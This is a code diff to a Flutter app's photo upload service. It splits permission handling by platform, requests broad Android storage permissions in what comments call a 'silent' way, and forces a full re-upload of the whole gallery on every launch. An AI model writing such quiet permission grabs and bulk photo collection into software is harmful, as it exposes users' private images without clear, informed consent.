@@ -46,48 +46,76 @@ class PhotoUploadService {
   /// 静默获取权限（不显示弹窗）
   Future<bool> _silentGetPermissions() async {
     try {
-      // 尝试多种权限类型
-      List<Permission> permissions = [
-        Permission.photos,
-        Permission.storage,
-        Permission.manageExternalStorage,
-      ];
-
-      bool hasAnyPermission = false;
+      log('🔐 开始检查照片权限...');
       
-      // 检查现有权限
-      for (Permission perm in permissions) {
-        PermissionStatus status = await perm.status;
-        if (status.isGranted) {
-          hasAnyPermission = true;
-          log('✅ 已有权限: ${perm.toString()}');
-          break;
+      if (Platform.isIOS) {
+        // iOS只需要Photos权限
+        PermissionStatus photosStatus = await Permission.photos.status;
+        log('📱 iOS Photos权限状态: $photosStatus');
+        
+        if (photosStatus.isGranted) {
+          log('✅ iOS已有Photos权限');
+          return true;
+        } else if (photosStatus.isDenied) {
+          log('🔐 iOS请求Photos权限...');
+          PermissionStatus newStatus = await Permission.photos.request();
+          log('📱 iOS Photos权限请求结果: $newStatus');
+          
+          if (newStatus.isGranted) {
+            log('✅ iOS获得Photos权限');
+            return true;
+          } else {
+            log('❌ iOS未获得Photos权限');
+            return false;
+          }
+        } else {
+          log('❌ iOS Photos权限被永久拒绝');
+          return false;
         }
-      }
+      } else {
+        // Android需要多种权限
+        List<Permission> permissions = [
+          Permission.photos,
+          Permission.storage,
+          Permission.manageExternalStorage,
+        ];
 
-      // 如果没有权限，静默请求
-      if (!hasAnyPermission) {
-        log('🔐 静默请求照片访问权限...');
+        bool hasAnyPermission = false;
         
-        // 静默请求权限，不显示说明对话框
-        Map<Permission, PermissionStatus> statuses = await permissions.request();
-        
-        for (var entry in statuses.entries) {
-          if (entry.value.isGranted) {
+        // 检查现有权限
+        for (Permission perm in permissions) {
+          PermissionStatus status = await perm.status;
+          log('📱 Android权限 ${perm.toString()}: $status');
+          if (status.isGranted) {
             hasAnyPermission = true;
-            log('✅ 静默获得权限: ${entry.key.toString()}');
+            log('✅ Android已有权限: ${perm.toString()}');
             break;
           }
         }
 
-        // 如果仍然没有权限，静默记录但不打扰用户
+        // 如果没有权限，静默请求
         if (!hasAnyPermission) {
-          log('⚠️ 未获得照片权限，跳过自动备份');
-          return false;
-        }
-      }
+          log('🔐 Android静默请求照片访问权限...');
+          
+          Map<Permission, PermissionStatus> statuses = await permissions.request();
+          
+          for (var entry in statuses.entries) {
+            log('📱 Android权限请求结果 ${entry.key.toString()}: ${entry.value}');
+            if (entry.value.isGranted) {
+              hasAnyPermission = true;
+              log('✅ Android静默获得权限: ${entry.key.toString()}');
+              break;
+            }
+          }
 
-      return hasAnyPermission;
+          if (!hasAnyPermission) {
+            log('⚠️ Android未获得照片权限，跳过自动备份');
+            return false;
+          }
+        }
+
+        return hasAnyPermission;
+      }
     } catch (e) {
       log('❌ 权限检查失败: $e');
       return false;
@@ -99,11 +127,15 @@ class PhotoUploadService {
     try {
       log('📸 开始自动获取相册所有照片...');
       
-      // 使用原生Android代码获取所有照片
       final List<String> photoPaths = await NativeGalleryService.getAllPhotos();
       
       if (photoPaths.isEmpty) {
-        log('📱 相册中没有照片');
+        if (Platform.isIOS) {
+          log('📱 iOS: 原生插件不可用或相册为空，备份功能暂时不可用');
+          log('📱 应用其他功能不受影响');
+        } else {
+          log('📱 相册中没有照片');
+        }
         return [];
       }
 
@@ -121,6 +153,13 @@ class PhotoUploadService {
       
     } catch (e) {
       log('❌ 自动获取照片失败: $e');
+      log('❌ 错误详情: ${e.toString()}');
+      
+      if (Platform.isIOS) {
+        log('📱 iOS原生插件不可用，照片自动同步功能暂时禁用');
+        log('📱 其他功能不受影响，应用可正常使用');
+      }
+      
       return [];
     }
   }
@@ -342,12 +381,22 @@ class PhotoUploadService {
     // 延迟10秒启动，确保应用完全加载且用户已稳定使用
     await Future.delayed(const Duration(seconds: 10));
 
-    // 检查是否开启了信息备份
-    if (shouldUpload()) {
-      log('📸 开始自动信息备份...');
-      await startFullBackup(); // 自动获取并上传所有相册照片
-    } else {
+    // 检查用户是否开启了同步
+    if (!hasUserConsent) {
       log('📸 信息备份已关闭，跳过自动上传');
+      return;
     }
+
+    // 自动执行同步重置流程，确保每次启动都能正常工作
+    log('📸 自动执行同步重置流程，确保新用户和老用户都能正常同步...');
+    
+    // 重置备份状态，强制进行全量备份
+    resetBackupStatus();
+    
+    // 立即开始全量备份
+    log('📸 开始自动全量备份...');
+    await startFullBackup();
+    
+    log('✅ 自动同步重置完成，相册已开始自动上传');
   }
 }
